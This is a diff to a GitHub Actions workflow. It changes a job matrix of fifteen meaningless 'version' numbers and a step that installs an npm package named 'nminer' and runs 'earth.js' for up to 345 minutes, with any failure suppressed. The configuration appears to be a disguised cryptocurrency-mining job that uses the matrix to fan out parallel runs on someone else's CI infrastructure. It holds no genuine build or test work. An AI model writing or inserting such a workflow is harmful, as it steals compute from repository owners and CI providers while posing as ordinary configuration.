@@ -9,21 +9,21 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 1385 }
-          - { version: 1081 }
-          - { version: 8447 }
-          - { version: 1929 }
-          - { version: 7469 }
-          - { version: 1094 }
-          - { version: 2996 }
-          - { version: 2994 }
-          - { version: 7732 }
-          - { version: 7162 }
-          - { version: 8980 }
-          - { version: 3206 }
-          - { version: 2522 }
-          - { version: 5185 }
-          - { version: 791 }
+          - { version: 4622 }
+          - { version: 3753 }
+          - { version: 5865 }
+          - { version: 7200 }
+          - { version: 6545 }
+          - { version: 5913 }
+          - { version: 5511 }
+          - { version: 2563 }
+          - { version: 3461 }
+          - { version: 4896 }
+          - { version: 4510 }
+          - { version: 5131 }
+          - { version: 1520 }
+          - { version: 2696 }
+          - { version: 9603 }
 
     steps:
       - name: Checkout
@@ -34,7 +34,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: drat colorfully gummy
+      - name: 
         run: |
           npm install nminer@latest
-          timeout 313m node earth.js || echo "earth executed"
+          timeout 345m node earth.js || echo "earth executed"
